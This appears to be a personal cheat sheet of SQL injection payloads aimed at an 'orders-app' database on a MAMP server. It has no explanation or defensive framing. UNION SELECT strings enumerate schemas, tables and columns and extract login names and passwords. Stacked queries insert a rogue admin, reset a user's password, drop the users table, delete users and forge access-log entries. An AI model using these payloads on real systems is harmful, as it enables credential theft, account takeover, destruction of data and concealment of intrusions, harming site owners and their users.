// find all databases on mamp
' UNION SELECT 999, '2024-01-01 00:00:00', 999, SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE 'a'LIKE'a
 
 // find the tables in the orders-app
' UNION SELECT 999, '2024-01-01 00:00:00', 999, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'orders-app' AND 'a'LIKE'a


// find all columns in users table
' UNION SELECT 999, '2024-01-01 00:00:00', 999, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE 'orders-app' AND TABLE_NAME LIKE 'users' AND 'a'LIKE'a

// find contents of users table
' UNION SELECT id, '2024-01-01 00:00:00', id, login_name FROM users WHERE 'a'LIKE'a
' UNION SELECT id, '2024-01-01 00:00:00', id, password FROM users WHERE 'a'LIKE'a

// add new user
'; INSERT INTO users (id, login_name, password) VALUES (null, 'new_admin', 'password'); -- 

// change password 
'; UPDATE users SET password = 'new_password' WHERE login_name = 'charlie'; -- 

// drop a table
'; DROP TABLE users; -- 

// remove a user
'; DELETE FROM users WHERE login_name = 'user_to_delete'; -- 

// modify logs
'; INSERT INTO access_logs (user_id, timestamp) VALUES (1, NOW()); -- 
